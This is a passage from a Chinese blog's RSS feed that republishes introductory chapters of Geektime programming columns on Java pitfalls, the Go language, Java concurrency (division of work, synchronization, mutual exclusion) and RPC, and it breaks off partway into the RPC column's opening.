&lt;li>完整且连续，知其所以然。我会按照&amp;quot;知识介绍 -&amp;gt; 还原业务场景 -&amp;gt; 错误实现 -&amp;gt; 正确实现 -&amp;gt; 原理分析 -&amp;gt; 小总结 &amp;ldquo;来讲解每个案例，针对每个坑点我至少会给出一个解决方案，并会挑选核心的点和你剖析源码。这样一来，你不仅能避坑，更能知道产生坑的根本原因，提升自己的技术能力。&lt;/li>
&lt;li>授人以渔。在遇到问题的时候，我们一定是先通过经验和工具来定位分析问题，然后才能定位到坑，并不是一开始就知道为什么的。在这个课程中，我会尽可能地把分析问题的过程完整地呈现给你，而不是直接告诉你为什么，这样你以后遇到问题时也能有解决问题的思路。&lt;/li>
&lt;/ul>
&lt;p>这也是为什么，网络上虽然有很多关于 Java 代码踩坑的资料，但很多同学却和我反馈说，看过之后印象不深刻，也因为没吃透导致在一个知识点上重复踩坑。鉴于此，我还会与你分析我根据多年经验和思考，梳理出的一些最佳实践。&lt;/p>
&lt;p>看到这里，是不是迫不及待地想要看看这个专栏的内容都会涉及哪些坑点了呢？那就看看下面这张思维导图吧：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/0e/20/0ee7e3490bae45d6f0ce06a050695020.jpg" alt="">&lt;/p>
&lt;p>鉴于这个专栏的内容和特点，我再和你说说最佳的学习方式是什么。&lt;/p>
&lt;h1 id="学习课程的最佳方法">学习课程的最佳方法&lt;/h1>
&lt;p>我们都知道，编程是一门实践科学，只看不练、不思考，效果通常不会太好。因此，我建议你打开每篇文章后，能够按照下面的方式深入学习：&lt;/p>
&lt;ul>
&lt;li>对于每一个坑点，实际运行调试一下源码，使用文中提到的工具和方法重现问题，眼见为实。&lt;/li>
&lt;li>对于每一个坑点，再思考下除了文内的解决方案和思路外，是否还有其他修正方式。&lt;/li>
&lt;li>对于坑点根因中涉及的 JDK 或框架源码分析，你可以找到相关类再系统阅读一下源码。&lt;/li>
&lt;li>实践课后思考题。这些思考题，有的是对文章内容的补充，有的是额外容易踩的坑。&lt;/li>
&lt;/ul>
&lt;p>理解了课程涉及的所有案例后，你应该就对业务代码大部分容易犯错的点了如指掌了，不仅仅自己可以写出更高质量的业务代码，还可以在审核别人代码时发现可能存在的问题，帮助整个团队成长。&lt;/p>
&lt;p>当然了，你从这个课程收获的将不仅是解决案例中那些问题的方法，还可以提升自己分析定位问题、阅读源码的能力。当你再遇到其他诡异的坑时，也能有清晰的解决思路，也可以成长为一名救火专家，帮助大家一起定位、分析问题。&lt;/p>
&lt;p>好了，以上就是我今天想要和你分享的内容了。请赶快跟随我们的课程开启避坑之旅吧，也欢迎你留言说说自己的情况，你都踩过哪些坑、对写业务代码又有哪些困惑？我们下一讲见！&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨跟着学，你也能成为Go语言高手</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E8%B7%9F%E7%9D%80%E5%AD%A6%E4%BD%A0%E4%B9%9F%E8%83%BD%E6%88%90%E4%B8%BAgo%E8%AF%AD%E8%A8%80%E9%AB%98%E6%89%8B/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E8%B7%9F%E7%9D%80%E5%AD%A6%E4%BD%A0%E4%B9%9F%E8%83%BD%E6%88%90%E4%B8%BAgo%E8%AF%AD%E8%A8%80%E9%AB%98%E6%89%8B/</guid><description>
&lt;p>你好，我是郝林。今天想跟你聊聊我和 Go 语言的故事。&lt;/p>
&lt;p>Go 语言是由 Google 出品的一门通用型计算机编程语言。作为在近年来快速崛起的编程语言，Go 已经成功跻身主流编程语言的行列。&lt;/p>
&lt;p>它的种种亮点都受到了广大编程爱好者的追捧。特别是一些对团队协作有较高要求的公司和技术团队，已经在有意识地大量使用 Go 语言编程，并且，使用的人群还在持续迅猛增长。&lt;/p>
&lt;p>我个人很喜欢 Go 语言。我是从 2012 年底开始关注 Go 语言的，虽然这个日期与 Go 语言诞生的 2009 年 11 月 10 日相比并不算早，但我也算得上国内比较早期的使用者了。&lt;/p>
&lt;p>Go 程序可以在装有 Windows、Linux、FreeBSD 等操作系统的服务器上运行，并用于提供基础软件支撑、API 服务、Web 服务、网页服务等等。&lt;/p>
&lt;p>Go 语言也在移动端进行了积极的探索，现在在 Android 和 iOS 上都可以运行其程序。另外，Go 语言也已经与 WebAssembly 强强联合，加入了 WASM 平台。这意味着过不了多久，互联网浏览器也可以运行 Go 编写的程序了。&lt;/p>
&lt;p>从业务维度看，在云计算、微服务、大数据、区块链、物联网等领域，Go 语言早已蓬勃发展。有的使用率已经非常之高，有的已有一席之地。即使是在 Python 为王的数据科学和人工智能领域，Go 语言也在缓慢渗透，并初露头角。&lt;/p>
&lt;p>从公司角度看，许多大厂都已经拥抱 Go 语言，包括以 Java 打天下的阿里巴巴，更别提深爱着 Go 语言的滴滴、今日头条、小米、奇虎 360、京东等明星公司。同时，创业公司也很喜欢 Go 语言，主要因为其入门快、程序库多、运行迅速，很适合快速构建互联网软件产品，比如轻松筹、快手、知乎、探探、美图、猎豹移动等等。&lt;/p>
&lt;p>我从 2013 年开始准备撰写《Go 并发编程实战》这本书，在经历了一些艰辛和坎坷之后，本书终于在 2014 年底由人民邮电出版社的图灵公司正式出版。&lt;/p>
&lt;p>时至今日，《Go 并发编程实战》的第 2 版已经出版一年多了，也受到了广大 Go 语言爱好者的欢迎。同时，我也发起和维护着一个 Go 语言爱好者组织 GoHackers，至今已有近 4000 人的规模。我们每年都会举办一些活动，交流技术、互通有无。当然，我们平常都会在一些线上的群组里交流。欢迎你的加入。&lt;/p>
&lt;p>2015 年初，我开始帮助公司和团队招聘 Go 程序员。我面试过的 Go 程序员应该已经有几百个了。虽然一场面试的交流内容远不止技术能力这种硬技能，更别提只限于一门编程语言。&lt;/p>
&lt;p>但是就事论事，我在这里只说 Go 语言。在所有的应聘者当中，真正掌握 Go 语言基础知识的比例恐怕超不过 50%，而真正熟悉 Go 语言高阶技术的比例也不超过 30%。当然了，情况是明显一年比一年好的，尤其是今年。&lt;/p>
&lt;p>我写此专栏的初衷是，让希望迅速掌握 Go 语言的爱好者们，通过一种比较熟悉和友好的路径去学习。我并不想事无巨细地去阐述 Go 语言规范的每个细节以及其标准库中的每个 API，更不想写那种填鸭式的教学文章，我更想去做的是详细论述这门语言的重点和主线。&lt;/p>
&lt;p>我会努力探究我们对新技能，尤其是编程语言的学习方式，并以这种方式一步步带领和引导你去记忆和实践。我几乎总会以一道简单的题目为引子，并以一连串相关且重要的概念和知识为主线，而后再进行扩充，以助你进行发散性的思考。&lt;/p>
&lt;p>我希望用这种先点、后线、再面的方式，帮你占领一个个重要的阵地。别的不敢说，如果你认真地跟我一起走完这个专栏，那么基本掌握 Go 语言是肯定的。&lt;/p>
&lt;p>为什么说基本掌握？因为软件技术，尤其是编程技术，必须经过很多的实践甚至历练才能完全掌握，这需要时间而不能速成。不过，本专栏一定会成为你学习 Go 语言最重要的敲门砖和垫脚石。&lt;/p>
&lt;p>下面，我们一起浏览一下本专栏的主要模块，一共分成 3 大模块，5 个章节。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>基础概念：我会讲述 Go 语言基础中的基础，包括一些基本概念和运作机制。它们都应该是你初识 Go 语言时必须知道的，同时也有助于你理解后面的知识。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>数据类型和语句：Go 语言中的数据类型大都是很有特色的，你只有理解了它们才能真正玩转 Go 语言。我将和你一起与探索它们的奥妙。另外，我也会一一揭示怎样使用各种语法和语句操纵它们。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Go 程序的测试：很多程序员总以为测试是另一个团队的事情，其实不然。单元测试甚至接口测试其实都应该是程序员去做的，并且应该受到重视。在 Go 语言中怎样做好测试这件事？我会跟你说清楚、讲明白。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>标准库的用法：虽然 Go 语言提供了自己的高效并发编程方式，但是同步方法依然不容忽视。这些方法集中在&lt;code>sync&lt;/code>代码包及其子包中。这部分还涉及了字节和字符问题、OS 操控方法和 Web 服务写法等，这些都是我们在日常工作中很可能会用到的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Go 语言拾遗：这部分将会讲述一些我们使用 Go 语言做软件项目的过程中很可能会遇到的问题，至少会包含两篇文章，是附赠给广大 Go 语言爱好者的。虽然我已经有一个计划了，但是具体会讲哪些内容我还是选择暂时保密。请你和我一起小期待一下吧。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>我希望本专栏能帮助或推动你去做更多的实践和思考。同时我也希望，你能通过学习本专栏感受到学习的快乐，并能够在应聘 Go 语言相关岗位的时候更加游刃有余。&lt;/p>
&lt;p>所以，如果学，请深学。我不敢自称布道师，但很愿意去做推广优秀技术的事情。如果我的输出能为你的宝塔添砖加瓦，那将会是我的快乐之源。我也相信这几十篇文章可以做到这一点。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/35/48/358e4e8578a706598e18a7dfed3ed648.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 00丨预习篇丨写给0基础入门的Go语言学习者</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/00%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E4%B8%A8%E5%86%99%E7%BB%990%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%9A%84go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%80%85/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/go-%E8%AF%AD%E8%A8%80%E6%A0%B8%E5%BF%83-36-%E8%AE%B2/00%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E4%B8%A8%E5%86%99%E7%BB%990%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%9A%84go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%80%85/</guid><description>
&lt;p>你好，我是郝林，今天我分享的内容是：0 基础的你，如何开始入门学习 Go 语言。&lt;/p>
&lt;ol>
&lt;li>你需要遵循怎样的学习路径来学习 Go 语言？&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>我们发现，订阅本专栏的同学们都在非常积极的学习和讨论，这让我们非常欣慰，并且和你一样干劲十足。不过，我在留言中发现，大家的基础好像都不太一样，大致可以分为这么几类。&lt;/p>
&lt;ul>
&lt;li>零基础的同学：可能正准备入行或者刚刚对编程感兴趣，可以熟练操作电脑，但是对计算机、操作系统以及网络方面的知识不太了解。&lt;/li>
&lt;li>无编程经验或者编程经验较少的同学：可能正在从事其他的技术相关工作，也许可以熟练编写脚本，但是对程序设计的通用知识和技巧还不太了解。&lt;/li>
&lt;li>有其他语言编程经验的同学：可能已成为程序员或软件工程师，可以用其他的编程语言熟练编写程序，但是对 Go 语言还不太了解。&lt;/li>
&lt;li>有一定 Go 语言编程经验的同学：已有 Go 语言编程基础，写过一些 Go 语言程序，但是急需进阶却看不清途径。&lt;/li>
&lt;/ul>
&lt;p>基于以上分类，我为大家制定了一份 Go 语言学习路径。不论你属于上面的哪一类，都可以按照此路径去学习深造。具体请看下面的思维导图。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/c7/b7/c702df29da67be3c4083ecce1d0eadb7.png" alt="">&lt;/p>
&lt;p>（长按保存大图）&lt;/p>
&lt;ol start="2">
&lt;li>学习本专栏前，你需要有哪些基础知识储备？&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>在这个专栏里，我会假设你有一定的计算机基础，比如，知道操作系统是什么、环境变量怎么设置、命令行怎样使用，等等。&lt;/p>
&lt;p>另外，我还会假定你具备一点点编程知识，比如，知道程序是什么、程序通常会以怎样的形式存在，以及程序与操作系统和计算机有哪些关系，等等。&lt;/p>
&lt;p>对了，还有在这个早已成熟的移动互联网时代，想学编程的你，一定也应该知道那些最最基本的网络知识。&lt;/p>
&lt;p>我在本专栏里只会讨论 Go 语言的代码和程序，而不会提及太多计算机体系结构或软件工程方面的事情。所以你即使没有专门学过计算机系统或者软件工程也没有关系，我会尽量连带讲一些必要的基础概念和知识。&lt;/p>
&lt;p>从 2018 年开始，随着 Google 逐渐重回中国，Go 语言的官方网站在 Google 中国的域名下也有了镜像，毕竟中国是 Go 语言爱好者最多的国家，同时也是 Go 语言使用最广泛的一片土地。如果你在国内，可以敲入&lt;a href="https://golang.google.cn">这个网址&lt;/a>来访问 Go 语言的官网。&lt;/p>
&lt;p>这个专栏专注于 Go 语言的核心知识，因此我并不会深入说明所有关于语法和命令的细枝末节。如果你想去全面了解 Go 语言的所有语法，那么可以去 Go 语言官网的&lt;a href="https://golang.google.cn/ref/spec">语言规范页面&lt;/a>仔细查阅。&lt;/p>
&lt;p>当然了，这里的语言规范是全英文的，如果你想看汉化的内容也是有选择的，我记得先后有几拨国内的 Go 语言爱好者自发组织翻译过。不过我都没有仔细看过，不知道质量如何，所以在这里就不特别推荐了。&lt;/p>
&lt;p>对于从事计算机和软件开发相关工作的同学，我强烈建议你们要有意地训练快速阅读英文文档的能力，不论是否借助字典和翻译工具。&lt;/p>
&lt;p>不过，如果你想专门学习一下 Go 命令方面的知识和技巧，那么我推荐你看看我之前写的免费开源教程《&lt;a href="https://github.com/hyper0x/go_command_tutorial">Go 命令教程&lt;/a>》。这份教程的内容虽然稍显陈旧，但是帮助你学会使用 Go 语言自带的常用命令和工具肯定是没问题的。&lt;/p>
&lt;p>好了，其实即使你是个编程小白也不用过于担心，我们会一起帮助你的。至于我刚刚说的 Go 语言规范和 Go 命令教程，你也可以在学习本专栏的过程中根据实际需要去有针对性的阅读。&lt;/p>
&lt;ol start="3">
&lt;li>这里有一份基础知识列表，请查收&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>如果你阅读本专栏的第一个模块时感觉有些吃力，那可能是你还没有熟悉 Go 语言的一些基础概念和知识。我为你精心制作了一张 Go 语言基础知识的导图，里面几乎包含了入门 Go 语言所需的所有知识点。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ad/85/add8566dc5431378bda313a32a6ebb85.jpg" alt="">&lt;br>
（长按保存大图）&lt;/p>
&lt;p>有了这些，你是否已经感觉学习本专栏会更加轻松了呢？&lt;/p>
&lt;p>总之，教程、资料和助推就交给我和极客时间的编辑、运营们来共同负责。而你需要做的，就是保存好这一份对 Go 语言学习的决心，你可以自己去尝试整理一份 Go 语言的学习笔记，遇见不懂的地方，你也可以在文章下面留言，我们一起讨论。&lt;/p>
&lt;p>好了，感谢你的收听，我们下期再见。&lt;/p>
&lt;p>&lt;a href="https://github.com/hyper0x/Golang_Puzzlers">戳此查看 Go 语言专栏文章配套详细代码。&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/35/48/358e4e8578a706598e18a7dfed3ed648.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 学习攻略如何才能学好并发编程？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/%E5%AD%A6%E4%B9%A0%E6%94%BB%E7%95%A5%E5%A6%82%E4%BD%95%E6%89%8D%E8%83%BD%E5%AD%A6%E5%A5%BD%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/%E5%AD%A6%E4%B9%A0%E6%94%BB%E7%95%A5%E5%A6%82%E4%BD%95%E6%89%8D%E8%83%BD%E5%AD%A6%E5%A5%BD%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</guid><description>
&lt;p>并发编程并不是一门相对独立的学科，而是一个综合学科。并发编程相关的概念和技术看上非常零散，相关度也很低，总给你一种这样的感觉：我已经学习很多相关技术了，可还是搞不定并发编程。那如何才能学习好并发编程呢？&lt;/p>
&lt;p>其实很简单，只要你能从两个方面突破一下就可以了。一个是&amp;quot;跳出来，看全景&amp;quot;，另一个是&amp;quot;钻进去，看本质&amp;quot;。&lt;/p>
&lt;h2 id="跳出来看全景">跳出来，看全景&lt;/h2>
&lt;p>我们先说&amp;quot;跳出来&amp;quot;。你应该也知道，学习最忌讳的就是&amp;quot;盲人摸象&amp;quot;，只看到局部，而没有看到全局。所以，你需要从一个个单一的知识和技术中&amp;quot;跳出来&amp;quot;，高屋建瓴地看并发编程。当然，这&lt;strong>首要之事就是你建立起一张全景图&lt;/strong>。&lt;/p>
&lt;p>不过，并发编程相关的知识和技术还真是错综复杂，时至今日也还没有一张普遍认可的全景图，也许这正是很多人在并发编程方面难以突破的原因吧。好在经过多年摸爬滚打，我自己已经&amp;quot;勾勒&amp;quot;出了一张全景图，不一定科学，但是在某种程度上我想它还是可以指导你学好并发编程的。&lt;/p>
&lt;p>在我看来，并发编程领域可以抽象成&lt;strong>三个核心问题：分工、同步和互斥&lt;/strong>。&lt;/p>
&lt;h3 id="1-分工">1. 分工&lt;/h3>
&lt;p>所谓分工，类似于现实中一个组织完成一个项目，项目经理要拆分任务，安排合适的成员去完成。&lt;/p>
&lt;p>在并发编程领域，你就是项目经理，线程就是项目组成员。任务分解和分工对于项目成败非常关键，不过在并发领域里，分工更重要，它直接决定了并发程序的性能。在现实世界里，分工是很复杂的，著名数学家华罗庚曾用&amp;quot;烧水泡茶&amp;quot;的例子通俗地讲解了统筹方法（一种安排工作进程的数学方法），&amp;ldquo;烧水泡茶&amp;quot;这么简单的事情都这么多说道，更何况是并发编程里的工程问题呢。&lt;/p>
&lt;p>既然分工很重要又很复杂，那一定有前辈努力尝试解决过，并且也一定有成果。的确，在并发编程领域这方面的成果还是很丰硕的。Java SDK 并发包里的 Executor、Fork/Join、Future 本质上都是一种分工方法。除此之外，并发编程领域还总结了一些设计模式，基本上都是和分工方法相关的，例如生产者 - 消费者、Thread-Per-Message、Worker Thread 模式等都是用来指导你如何分工的。&lt;/p>
&lt;p>学习这部分内容，最佳的方式就是和现实世界做对比。例如生产者 - 消费者模式，可以类比一下餐馆里的大厨和服务员，大厨就是生产者，负责做菜，做完放到出菜口，而服务员就是消费者，把做好的菜给你端过来。不过，我们经常会发现，出菜口有时候一下子出了好几个菜，服务员是可以把这一批菜同时端给你的。其实这就是生产者 - 消费者模式的一个优点，生产者一个一个地生产数据，而消费者可以批处理，这样就提高了性能。&lt;/p>
&lt;h3 id="2-同步">2. 同步&lt;/h3>
&lt;p>分好工之后，就是具体执行了。在项目执行过程中，任务之间是有依赖的，一个任务结束后，依赖它的后续任务就可以开工了，后续工作怎么知道可以开工了呢？这个就是靠沟通协作了，这是一项很重要的工作。&lt;/p>
&lt;p>在并发编程领域里的同步，主要指的就是线程间的协作，本质上和现实生活中的协作没区别，不过是&lt;strong>一个线程执行完了一个任务，如何通知执行后续任务的线程开工&lt;/strong>而已。&lt;/p>
&lt;p>协作一般是和分工相关的。Java SDK 并发包里的 Executor、Fork/Join、Future 本质上都是分工方法，但同时也能解决线程协作的问题。例如，用 Future 可以发起一个异步调用，当主线程通过 get() 方法取结果时，主线程就会等待，当异步执行的结果返回时，get() 方法就自动返回了。主线程和异步线程之间的协作，Future 工具类已经帮我们解决了。除此之外，Java SDK 里提供的 CountDownLatch、CyclicBarrier、Phaser、Exchanger 也都是用来解决线程协作问题的。&lt;/p>
&lt;p>不过还有很多场景，是需要你自己来处理线程之间的协作的。&lt;/p>
&lt;p>工作中遇到的线程协作问题，基本上都可以描述为这样的一个问题：&lt;strong>当某个条件不满足时，线程需要等待，当某个条件满足时，线程需要被唤醒执行&lt;/strong>。例如，在生产者 - 消费者模型里，也有类似的描述，&amp;ldquo;当队列满时，生产者线程等待，当队列不满时，生产者线程需要被唤醒执行；当队列空时，消费者线程等待，当队列不空时，消费者线程需要被唤醒执行。&amp;rdquo;&lt;/p>
&lt;p>在 Java 并发编程领域，解决协作问题的核心技术是&lt;strong>管程&lt;/strong> ，上面提到的所有线程协作技术底层都是利用管程解决的。管程是一种解决并发问题的通用模型，除了能解决线程协作问题，还能解决下面我们将要介绍的互斥问题。可以这么说，&lt;strong>管程是解决并发问题的万能钥匙&lt;/strong>。&lt;/p>
&lt;p>所以说，这部分内容的学习，关键是理解管程模型，学好它就可以解决所有问题。其次是了解 Java SDK 并发包提供的几个线程协作的工具类的应用场景，用好它们可以妥妥地提高你的工作效率。&lt;/p>
&lt;h3 id="3-互斥">3. 互斥&lt;/h3>
&lt;p>分工、同步主要强调的是性能，但并发程序里还有一部分是关于正确性的，用专业术语叫&amp;rdquo;&lt;strong>线程安全&lt;/strong>&amp;quot;。并发程序里，当多个线程同时访问同一个共享变量的时候，结果是不确定的。不确定，则意味着可能正确，也可能错误，事先是不知道的。而导致不确定的主要源头是可见性问题、有序性问题和原子性问题，为了解决这三个问题，Java 语言引入了内存模型，内存模型提供了一系列的规则，利用这些规则，我们可以避免可见性问题、有序性问题，但是还不足以完全解决线程安全问题。解决线程安全问题的核心方案还是互斥。&lt;/p>
&lt;p>&lt;strong>所谓互斥，指的是同一时刻，只允许一个线程访问共享变量。&lt;/strong>&lt;/p>
&lt;p>实现互斥的核心技术就是锁，Java 语言里 synchronized、SDK 里的各种 Lock 都能解决互斥问题。虽说锁解决了安全性问题，但同时也带来了性能问题，那如何保证安全性的同时又尽量提高性能呢？可以分场景优化，Java SDK 里提供的 ReadWriteLock、StampedLock 就可以优化读多写少场景下锁的性能。还可以使用无锁的数据结构，例如 Java SDK 里提供的原子类都是基于无锁技术实现的。&lt;/p>
&lt;p>除此之外，还有一些其他的方案，原理是不共享变量或者变量只允许读。这方面，Java 提供了 Thread Local 和 final 关键字，还有一种 Copy-on-write 的模式。&lt;/p>
&lt;p>使用锁除了要注意性能问题外，还需要注意死锁问题。&lt;/p>
&lt;p>这部分内容比较复杂，往往还是跨领域的，例如要理解可见性，就需要了解一些 CPU 和缓存的知识；要理解原子性，就需要理解一些操作系统的知识；很多无锁算法的实现往往也需要理解 CPU 缓存。这部分内容的学习，需要博览群书，在大脑里建立起 CPU、内存、I/O 执行的模拟器。这样遇到问题就能得心应手了。&lt;/p>
&lt;p>跳出来，看全景，可以让你的知识成体系，所学知识也融汇贯通起来，由点成线，由线及面，画出自己的知识全景图。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/11/65/11e0c64618c04edba52619f41aaa3565.png" alt="">
并发编程全景图之思维导图&lt;/p>
&lt;h2 id="钻进去看本质">钻进去，看本质&lt;/h2>
&lt;p>但是光跳出来还不够，还需要下一步，就是在某个问题上钻进去，深入理解，找到本质。&lt;/p>
&lt;p>就拿我个人来说，我已经烦透了去讲述或被讲述一堆概念和结论，而不分析这些概念和结论是怎么来的，以及它们是用来解决什么问题的。在大学里，这样的教材很流行，直接导致了芸芸学子成绩很高，但解决问题的能力很差。其实，知其然知其所以然，才算真的学明白了。&lt;/p>
&lt;p>我属于理论派，&lt;strong>我认为工程上的解决方案，一定要有理论做基础&lt;/strong>。所以在学习并发编程的过程中，我都会探索它背后的理论是什么。比如，当看到 Java SDK 里面的条件变量 Condition 的时候，我会下意识地问，&amp;ldquo;它是从哪儿来的？是 Java 的特有概念，还是一个通用的编程概念？&amp;ldquo;当我知道它来自管程的时候，我又会问，&amp;ldquo;管程被提出的背景和解决的问题是什么？&amp;ldquo;这样一路探索下来，我发现 Java 语言里的并发技术基本都是有理论基础的，并且这些理论在其他编程语言里也有类似的实现。所以我认为，技术的本质是背后的理论模型。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>当初我学习 Java 并发编程的时候，试图上来就看 Java SDK 的并发包，但是很快就放弃了。原因是我觉得东西太多，眼花缭乱的，虽然借助网络上的技术文章，感觉都看懂了，但是很快就又忘了。实际应用的时候大脑也一片空白，根本不知道从哪里下手，有时候好不容易解决了个问题，也不知道这个方案是不是合适的。&lt;/p>
&lt;p>我知道根本原因是，我的并发知识还没有成体系。&lt;/p>
&lt;p>我想，要让自己的知识成体系，一定要挖掘 Java SDK 并发包背后的设计理念。Java SDK 并发包是并发大师 Doug Lea 设计的，他一定不是随意设计的，一定是深思熟虑的，其背后是 Doug Lea 对并发问题的深刻认识。可惜这个设计的思想目前并没有相关的论文，所以只能自己琢磨了。&lt;/p>
&lt;p>分工、同步和互斥的全景图，是我对并发问题的个人总结，不一定正确，但是可以帮助我快速建立解决并发问题的思路，梳理并发编程的知识，加深认识。我将其分享给你，希望对你也有用。&lt;/p>
&lt;p>对于某个具体的技术，我建议你探索它背后的理论本质，理论的应用面更宽，一项优秀的理论往往在多个语言中都有体现，在多个不同领域都有应用。所以探求理论本质，既能加深对技术本身的理解，也能拓展知识深度和广度，这是个一举多得的方法。这方面，希望我们一起探讨，共同进步。&lt;/p>
&lt;p>欢迎在留言区跟我分享你的经历与想法。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/cf/aa/cf393cd748a4f0e6451807c4b61843aa.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨别老想着怎么用好RPC框架，你得多花时间琢磨原理</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E5%88%AB%E8%80%81%E6%83%B3%E7%9D%80%E6%80%8E%E4%B9%88%E7%94%A8%E5%A5%BDrpc%E6%A1%86%E6%9E%B6%E4%BD%A0%E5%BE%97%E5%A4%9A%E8%8A%B1%E6%97%B6%E9%97%B4%E7%90%A2%E7%A3%A8%E5%8E%9F%E7%90%86/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/rpc%E5%AE%9E%E6%88%98%E4%B8%8E%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E5%88%AB%E8%80%81%E6%83%B3%E7%9D%80%E6%80%8E%E4%B9%88%E7%94%A8%E5%A5%BDrpc%E6%A1%86%E6%9E%B6%E4%BD%A0%E5%BE%97%E5%A4%9A%E8%8A%B1%E6%97%B6%E9%97%B4%E7%90%A2%E7%A3%A8%E5%8E%9F%E7%90%86/</guid><description>
&lt;p>你好，我是何小锋。欢迎你和我一起学习 RPC。&lt;/p>
&lt;p>在专栏开始之前，我先简单介绍下自己。我是 1998 年从北航毕业的，毕业以后我就一直在一线编程写代码。2011 年，我正式加入京东，刚好赶上了京东的快速发展期，一路做到了现在的技术架构部首席架构师。盘点下在京东的这 9 年时间，我参加过 17 次大促备战，和我的技术团队一起见证了京东的技术演进过程。我也曾带领团队攻克过很多技术领域难题，包括自主研发微服务框架、高性能消息中间件、智能监控以及容器平台等等。&lt;/p>
&lt;p>近几年，我主攻分布式系统架构与设计，这也是我的专长所在。而在搭建分布式系统的过程中，我发现 RPC 总能充当较为关键的角色，它对整个分布式系统性能的提升起到了非常重要的作用。&lt;/p>
&lt;p>我期待通过这个专栏，能把我这些年积攒的一些有关 RPC 的实战经验分享给你。&lt;/p>
&lt;h1 id="为什么要学习-rpc">为什么要学习 RPC？&lt;/h1>
&lt;p>做任何事情都应该 Start with Why，那我们就先来说说为什么要学习 RPC。要回答这个问题，我们就得先考虑下 RPC 的实际应用场景。&lt;/p>
&lt;p>说到 RPC，可能你的第一反应就是&amp;quot;微服务&amp;quot;。RPC 最大的特点就是可以让我们像调用本地一样发起远程调用，这一特点常常会让人感觉 RPC 就是为&amp;quot;微服务&amp;quot;或 SOA 而生的。现在的大多数应用系统发展到一定规模之后，都会向&amp;quot;微服务化&amp;quot;演进，演进后的大型应用系统也的确是由一个个&amp;quot;微服务&amp;quot;组成的。&lt;/p>
&lt;p>我们可以说 RPC 是&amp;quot;微服务&amp;quot;的基础，这一点是毋庸置疑的。现在我们就可以反过来想这样一个问题&amp;mdash;&amp;mdash;RPC 是不是只应用在&amp;quot;微服务&amp;quot;中呢？&lt;/p>
&lt;p>**当然不是，只要涉及到网络通信，我们就可能用到 RPC。**一起看这样两个例子。&lt;/p>
&lt;p>例 1：大型分布式应用系统可能会依赖消息队列、分布式缓存、分布式数据库以及统一配置中心等，应用程序与依赖的这些中间件之间都可以通过 RPC 进行通信。比如 etcd，它作为一个统一的配置服务，客户端就是通过 gRPC 框架与服务端进行通信的。&lt;/p>
&lt;p>例 2：我们经常会谈到的容器编排引擎 Kubernetes，它本身就是分布式的，Kubernetes 的 kube-apiserver 与整个分布式集群中的每个组件间的通讯，都是通过 gRPC 框架进行的。&lt;/p>
&lt;p>所以说，RPC 的应用场景还是非常广泛的。既然应用如此广泛，那它的核心价值又在哪里呢？&lt;/p>
&lt;p>&lt;strong>在我看来，RPC 是解决分布式系统通信问题的一大利器。&lt;/strong>&lt;/p>
